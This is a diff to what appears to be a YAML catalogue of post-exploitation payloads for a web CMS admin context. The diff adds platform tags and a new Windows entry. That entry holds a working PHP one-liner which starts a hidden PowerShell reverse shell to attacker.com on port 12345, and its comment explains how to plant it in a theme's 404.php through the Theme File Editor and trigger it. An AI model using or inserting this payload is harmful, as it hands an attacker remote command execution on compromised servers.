@@ -55,6 +55,19 @@ functions:
     contexts:
       admin:
     listener: tcp-server
+    platform: linux
+    tty: false
+  - blind: true
+    code: |
+      <?php $s=new COM('WScript.Shell');$s->exec('powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient(\"attacker.com\",12345);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}"'); ?>
+    comment: |
+      Windows variant: inject into an active theme file (e.g., 404.php) via the Theme
+      File Editor. Uses WScript.Shell COM to launch a hidden PowerShell reverse shell.
+      Trigger by visiting a non-existent page to load the 404 template.
+    contexts:
+      admin:
+    listener: tcp-server
+    platform: windows
     tty: false
   - blind: true
     code: |
@@ -72,6 +85,7 @@ functions:
       admin:
       plugin:
     listener: tcp-server
+    platform: linux
     tty: false
   ssrf:
   - code: |
